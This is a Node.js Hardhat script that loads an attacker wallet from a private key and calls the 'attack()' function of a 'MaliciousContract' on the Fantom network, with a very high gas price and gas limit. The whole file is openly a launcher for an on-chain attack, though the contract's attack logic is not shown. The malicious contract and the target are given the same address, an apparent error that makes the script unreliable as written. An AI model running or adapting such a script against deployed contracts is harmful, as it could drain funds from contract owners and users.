require("dotenv").config();
const { ethers } = require("hardhat");

async function main() {
    const provider = new ethers.providers.JsonRpcProvider(process.env.FANTOM_RPC_URL);
    const attacker = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    console.log("Configured attacker address:", attacker.address);

    const maliciousContractAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454"; // Updated address of the MaliciousContract
    const targetContractAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454"; // Address of the contract being attacked

    const MaliciousContract = new ethers.Contract(
        maliciousContractAddress,
        [
            "function attack() external",
            "event AttackExecuted(uint256 amount)",
            "event BalanceBeforeAttack(uint256 balance)"
        ],
        attacker
    );

    console.log("Attempting to execute attack on target contract:", targetContractAddress);

    try {
        console.log("Attempting to execute attack...");

        // Set a very high gas price
        const gasPrice = ethers.utils.parseUnits('1000', 'gwei'); // Set maximum desired gas price

        // Call the attack function with an increased gas limit and high gas price
        const tx = await MaliciousContract.attack({
            gasLimit: 5000000,  // Adjust gas limit as necessary
            gasPrice: gasPrice    // Set high gas price
        });

        const receipt = await tx.wait();
        
        console.log("Attack executed successfully!");
        console.log("Transaction hash:", receipt.transactionHash);
        console.log("Gas used:", receipt.gasUsed.toString());

    } catch (error) {
        console.error("Error during attack execution:", error.message);
    }
}

main()
    .then(() => console.log("Attack script completed"))
    .catch(console.error);
